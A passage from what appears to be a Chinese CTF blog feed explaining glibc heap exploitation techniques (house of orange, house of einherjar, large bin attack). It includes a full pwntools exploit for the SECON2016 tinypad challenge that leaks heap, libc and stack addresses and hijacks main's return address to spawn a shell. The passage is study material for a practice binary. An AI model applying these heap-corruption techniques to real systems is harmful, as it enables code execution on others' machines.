    <summary type="html">&lt;h2 id=&quot;house-of-orange&quot;&gt;&lt;a href=&quot;#house-of-orange&quot; class=&quot;headerlink&quot; title=&quot;house of orange&quot;&gt;&lt;/a&gt;house of orange&lt;/h2&gt;&lt;p&gt;修改&lt;code&gt;topchunk-&amp;gt;size&lt;/code&gt;为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。&lt;/p&gt;
&lt;p&gt;当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将&lt;code&gt;topchunk-&amp;gt;size&lt;/code&gt;减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行&lt;code&gt;_int_free (av, old_top, 1)&lt;/code&gt;将其放入unsorted bin。&lt;/p&gt;
&lt;p&gt;代码涉及&lt;code&gt;_int_malloc&lt;/code&gt;后边和&lt;code&gt;sysmalloc&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--house_of_einherjar SECON2016--tinypad</title>
    <link href="http://hhdx.xyz/2020/07/23/How2heap-house-of-einherjar-SECON2016-tinypad/"/>
    <id>http://hhdx.xyz/2020/07/23/How2heap-house-of-einherjar-SECON2016-tinypad/</id>
    <published>2020-07-23T01:57:08.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>和house of force很像，都是篡改top chunk。</p><p>off-by-one覆盖victim chunk的<code>pre_in_use</code>位，并修改<code>victim-&gt;pre_size</code>为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。</p><p><strong>victim需要临近top chunk</strong>，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="SECON2016-tinypad"><a href="#SECON2016-tinypad" class="headerlink" title="SECON2016 tinypad"></a>SECON2016 tinypad</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[A] Add memo</span><br><span class="line">[D] Delete memo</span><br><span class="line">[E] Edit memo</span><br><span class="line">[Q] Quit</span><br></pre></td></tr></table></figure><p>程序有一个tinypad全局变量，前0x100字节当做临时区域，后0x40存放一个结构体数组，结构体如下所示</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200723104723145.png" alt="image-20200723104723145"></p><p>Add：输入size，最大为0x100。后使用read_until读入数据，read_until中存在null byte off-by-one。</p><p>Delete：输入所要删除索引，释放空间，size置0。没有将指针置0，这里存在指针悬空。</p><p>Edit：对数据内容进行修改，使用strcpy拷贝到tinypad处，所以如果有<code>\x00</code>，这里会产生截断。且能够读入的大小为其字符串长度。</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>使用house of einherjar，通过指针悬空泄露堆地址，在tinypad处构造fakechunk。分配得到tinypad后0x40字节，在此处通过got泄露libc base，读出栈地址，将main函数返回地址修改为one gadget。</p><p>由于edit memo的特殊性，所以没办法对诸如<code>__free_hook</code>这样的进行修改，从而想到通过libc中的environ泄露栈地址，修改函数返回地址，而且main函数的返回地址在<code>__libc_start_main</code>附近，它的地址有效字节长度和所需的一致。</p><h3 id="house-of-einherjar-1"><a href="#house-of-einherjar-1" class="headerlink" title="house of einherjar"></a>house of einherjar</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tinypad    = <span class="number">0x602040</span></span><br><span class="line">one_gadget = <span class="number">0x40d82</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 1: 0x30</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 2: 0x30</span></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 3: 0x100</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 4: 0x90</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot; #   INDEX: 1\n # CONTENT: &quot;</span>)</span><br><span class="line">heap_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = heap_addr &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">fake_size = heap_base + <span class="number">0x30</span> + <span class="number">0x30</span> - tinypad</span><br></pre></td></tr></table></figure><p>程序存在指针悬空，通过两次释放同样大小的fastbin chunk，第二次释放的chunk-&gt;fd处就存有了heap地址（因为fastbin头插头取）。然后计算fake size。</p><p>memo 3：为目标chunk，溢出覆盖的就是它的<code>pre_in_use</code>，而且将它的chunk size控制在0x100，避免影响其<strong>后续</strong>与top chunk的合并。</p><p>memo4：避免delete(3)后，<strong>此时</strong>就与top chunk合并。同时不能是fastbin大小，要保证后续delete(4)后，其与top chunk进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># memo 1: 0x100</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># memo 2: 0x30</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>+p64(fake_size) + <span class="string">b&quot;\n&quot;</span>)     <span class="comment"># memo 3: 0x30</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>)+p64(fake_size)+p64(tinypad)+p64(tinypad) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">delete(<span class="number">4</span>)           <span class="comment"># consolidate with top chunk, avoid malloc unsorted bin check error</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>先分配处0xf8，而后使用临近的块溢出，在tinypad处构造fake chunk，释放memo4和memo1，先后与top chunk进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(elf.got[<span class="string">&quot;strlen&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&quot;\n&quot;</span>)     <span class="comment"># avoid free error</span></span><br><span class="line">io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">libc_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">0x14CBC0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x4009BC&quot;)</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">stack_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">mainret_addr = stack_addr - <span class="number">0xf0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit return address</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(mainret_addr) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+one_gadget) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;Q&quot;</span>)</span><br></pre></td></tr></table></figure><p>分配得到数组处的地址，多次释放分配这个数组，来对它进行修改。</p><p>直接释放<code>tinypad+0x100</code>，在对后一个chunk的检查会出错，使用<code>add(0x40, &quot;\n&quot;)</code>分配一个合法的后一个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 释放fastbin大小对后一个chunk的检查</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放非fastbin大小对后一个chunk的检查</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/SECON2016%20tinypad/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./tinypad&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(SIZE)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(Y/n)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;(INDEX)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    tinypad    = <span class="number">0x602040</span></span><br><span class="line">    one_gadget = <span class="number">0x40d82</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 1: 0x30</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 2: 0x30</span></span><br><span class="line">    add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 3: 0x100</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># 4: 0x90</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot; #   INDEX: 1\n # CONTENT: &quot;</span>)</span><br><span class="line">    heap_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_addr &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">    fake_size = heap_base + <span class="number">0x30</span> + <span class="number">0x30</span> - tinypad</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># 1: 0x100</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># 2: 0x30</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>+p64(fake_size) + <span class="string">b&quot;\n&quot;</span>)     <span class="comment"># 3: 0x30</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0</span>)+p64(fake_size)+p64(tinypad)+p64(tinypad) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    delete(<span class="number">4</span>)           <span class="comment"># consolidate with top chunk, avoid malloc unsorted bin check error</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0xe8</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(elf.got[<span class="string">&quot;strlen&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&quot;\n&quot;</span>)     <span class="comment"># avoid free error</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">    libc_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    libc_base = libc_addr - <span class="number">0x14CBC0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *0x4009BC&quot;)</span></span><br><span class="line">    add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">    stack_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    mainret_addr = stack_addr - <span class="number">0xf0</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(mainret_addr) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    edit(<span class="number">2</span>, p64(libc_base+one_gadget) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;Q&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap house_of_einherjar.c</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;house-of-einherjar&quot;&gt;&lt;a href=&quot;#house-of-einherjar&quot; class=&quot;headerlink&quot; title=&quot;house of einherjar&quot;&gt;&lt;/a&gt;house of einherjar&lt;/h2&gt;&lt;p&gt;和house of force很像，都是篡改top chunk。&lt;/p&gt;
&lt;p&gt;off-by-one覆盖victim chunk的&lt;code&gt;pre_in_use&lt;/code&gt;位，并修改&lt;code&gt;victim-&amp;gt;pre_size&lt;/code&gt;为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;victim需要临近top chunk&lt;/strong&gt;，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (__builtin_expect (chunksize_nomask (victim) &amp;lt;= &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; * SIZE_SZ, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              || __builtin_expect (chunksize_nomask (victim)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				   &amp;gt; av-&amp;gt;system_mem, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		malloc_printerr (&lt;span class=&quot;string&quot;&gt;&amp;quot;malloc(): memory corruption&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--large_bin_attack 0ctf2018--heapstorm2</title>
    <link href="http://hhdx.xyz/2020/07/18/How2heap-large-bin-attack-0ctf2018-heapstorm2/"/>
    <id>http://hhdx.xyz/2020/07/18/How2heap-large-bin-attack-0ctf2018-heapstorm2/</id>
    <published>2020-07-18T13:10:54.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-&gt;fd、bk_nextsize-&gt;fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。</p><p>这里比较难理解就是large bin的结构，特别是先前我被一个<a href="https://raw.githubusercontent.com/clxsh/pics/master/img/largebin.png">large bin结构图</a>所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/large_bin2.png" alt="glibc large bin"></p><h2 id="0ctf2018-heapstorm2"><a href="#0ctf2018-heapstorm2" class="headerlink" title="0ctf2018 heapstorm2"></a>0ctf2018 heapstorm2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><p>程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。</p><a id="more"></a><p>程序在0x13370800~0x13370818读入了0x18字节的随机数字，0x13370818复制了0x13370810处的8字节。0x13370800处的随机数用来异或模糊pointer，0x13370808处的随机数用来异或模糊size。0x13370810和0x13370818两处在view函数中用到。0x13370820后面用来存储结构体数组，结构体如下</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200719114215579.png" alt="image-20200719114215579"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; HEAP STORM II &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">1. Allocate</span><br><span class="line">2. Update</span><br><span class="line">3. Delete</span><br><span class="line">4. View</span><br><span class="line">5. Exit</span><br></pre></td></tr></table></figure><p>Allocate：分配size大小的空间，指针与大小在和随机数异或后，存储在数组中。</p><p>Update：对分配中得空间中的数据进行更新，大小只能小于等于size-12。这里存在null byte overflow</p><p>Delete：释放分配的空间，并清空结构体。</p><p>View：当<code>*(unsigned long*)0x13370810 ^ *(unsigned long*)0x13370818 = 0x13377331</code>输出空间内容，而初始时候这个位置内容一样。</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>null byte overflow造成堆块重叠，large bin attack在0x13370800前面构造fake chunk，将fake_chunk链接到unsorted 